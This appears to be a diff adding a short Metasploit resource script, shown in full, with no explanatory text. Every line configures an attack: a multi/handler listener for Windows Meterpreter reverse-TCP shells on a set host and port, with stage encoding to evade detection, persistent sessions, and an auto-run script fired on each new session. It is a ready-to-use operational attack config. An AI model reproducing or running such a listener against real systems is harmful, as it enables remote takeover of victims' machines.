@@ -1,0 +1,8 @@
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.230.49
+set LPORT 4444
+set ExitOnSession false
+set EnableStageEncoding true
+set AutoRunScript multi_console_command -r rainbow.rc
+exploit -j
